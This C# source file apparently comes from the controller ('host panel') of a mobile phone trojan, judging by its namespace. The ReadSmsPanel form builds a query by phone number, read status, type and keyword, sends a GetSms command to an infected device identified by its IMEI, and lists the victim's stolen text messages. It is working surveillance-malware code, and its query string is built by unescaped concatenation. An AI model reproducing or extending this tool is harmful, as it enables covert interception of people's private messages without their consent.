using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using InOut;
using InOut.PacketImp;
using InOut.Utils;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class ReadSmsPanel : UserControl
    {
        private readonly string imei;
        private readonly IServer server;

        public ReadSmsPanel(string imei, IServer server)
        {
            this.imei = imei;
            this.server = server;
            InitializeComponent();
            cbSmsContent.SelectedIndex = 0;
            cbSmsSource.SelectedIndex = 0;
        }

        private void btnSearch_Click(object sender, EventArgs e)
        {
            string request = GenRequest();
            server.CommandSender(imei, Protocol.GetSms, request.GetBytes());
        }

        private string GenRequest()
        {
            var builder = new StringBuilder();
            if (!string.IsNullOrEmpty(tbPhoneNumber.Text))
            {
                if (builder.Length != 0)
                {
                    builder.Append(" and");
                }
                builder.Append(" address = '");
                builder.Append(tbPhoneNumber.Text);
                builder.Append("'");

            }

            if (cbSmsContent.SelectedIndex != 0)
            {
                if (builder.Length != 0)
                {
                    builder.Append(" and");
                }
                builder.Append(" read = " + (cbSmsContent.SelectedIndex - 1));
            }

            if (cbSmsSource.SelectedIndex != 0)
            {
                if (builder.Length != 0)
                {
                    builder.Append(" and");
                }
                builder.Append(" type = " + (cbSmsSource.SelectedIndex));

            }

            if (!string.IsNullOrEmpty(tbSmsKeyWord.Text))
            {
                if (builder.Length != 0)
                    builder.Append(" and");
                builder.Append("body like '%" + tbSmsKeyWord.Text + "%'");
            }

            return builder.ToString();
        }

        public void UpdateSms(SMSPacket[] list)
        {
            if(list != null)
                Invoke(new MethodInvoker(() => UpdateSmsCore(list)));
        }

        private void UpdateSmsCore(IEnumerable<SMSPacket> list)
        {
            lvSms.Items.Clear();
            lvSms.BeginUpdate();

            foreach (var smsPacket in list)
            {
                lvSms.Items.Add(new ListViewItem(new[]
                    {
                        smsPacket.Type.ToString(),
                        smsPacket.Read.ToString(),
                        smsPacket.Address,
                        smsPacket.Body
                    }));
            }

            lvSms.EndUpdate();
        }
    }
}
